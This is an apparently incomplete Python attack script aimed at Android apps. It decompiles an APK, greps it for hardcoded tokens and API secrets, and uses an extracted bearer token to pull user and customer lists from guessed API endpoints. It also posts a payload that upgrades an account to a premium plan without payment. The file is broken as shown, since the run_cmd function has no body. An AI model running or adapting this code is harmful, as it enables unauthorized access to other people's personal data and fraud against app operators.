import os, sys, subprocess, json, re, requests, time, shutil

def run_cmd(cmd):

def setup_tools():
    print("[*] Installing required tools...")
    run_cmd("apt-get update -qq && apt-get install -y apktool jadx adb frida curl wget python3-pip")

def decompile_apk(apk_path):
    print("[*] Decompiling APK...")
    out_dir = "decompiled"
    if os.path.exists(out_dir):
        shutil.rmtree(out_dir)
    run_cmd(f"apktool d {apk_path} -o {out_dir}")
    # extract endpoints
    run_cmd(f"grep -rE 'https?://[a-zA-Z0-9./?=_%:-]*' {out_dir} | grep -i 'api\\|firebase\\|database' > endpoints.txt")
    run_cmd(f"grep -r 'const-string' {out_dir}/smali/ | grep -iE 'token|api_key|secret|authorization' > secrets.txt")
    if os.path.exists(f"{out_dir}/google-services.json"):
        shutil.copy(f"{out_dir}/google-services.json", ".")
    return out_dir

def extract_token_from_smali():
    # البحث عن التوكن في secrets.txt
    if not os.path.exists("secrets.txt"):
        return None
    with open("secrets.txt", "r") as f:
        data = f.read()
        match = re.search(r'[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', data)
        if match:
            return match.group(0)
    return None

def fetch_users_via_api(token, base_url):
    headers = {"Authorization": f"Bearer {token}"}
    users = []
    endpoints = ["/api/v1/users", "/api/users", "/api/customers", "/user/list"]
    for ep in endpoints:
        url = base_url.rstrip("/") + ep
        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                users.extend(r.json() if isinstance(r.json(), list) else [r.json()])
        except: pass
    return users

def upgrade_to_pro(token, base_url):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    payload = {"plan": "pro", "is_premium": True, "subscription_type": "premium"}
    url = base_url.rstrip("/") + "/api/v1/user/upgrade"
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=10)
        return r.status_code == 200 or r.status_code == 201
    except:
        return False
